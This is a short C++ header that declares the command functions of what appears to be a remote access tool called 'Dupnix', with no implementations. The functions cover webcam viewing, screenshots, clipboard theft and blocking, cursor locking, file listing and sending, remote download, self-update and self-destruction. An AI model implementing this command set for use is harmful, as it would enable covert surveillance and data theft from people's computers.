#pragma once
#include <string>

void getStatus(std::string);
void setID(std::string newID);
void setVolume(std::string value);
void Screenshot(std::string highquality);
void monitorOff(std::string);
void monitorOn(std::string);
void SetCursor(std::string cords);
void Delay(std::string delay);
void BlockCursor(std::string time);
void BlockClipboard(std::string yesornot);
void Press(std::string to_press);
void hotkeys(std::string hotkey);
void SendClipboard(std::string);
void Autodestruction(std::string);
void WriteToClipboard(std::string to_write);
void ProcessList(std::string);
void IsFileExists(std::string path);
void WebcamView(std::string);
void RunningApps(std::string);
void ListOfFiles(std::string path);
void WifiList(std::string);
void TurnCloseForeground(std::string turn);
void ChangeCfg(std::string change);
void UpdateDupnix(std::string link);
void DownloadFile(std::string link);
void SendFile(std::string path);
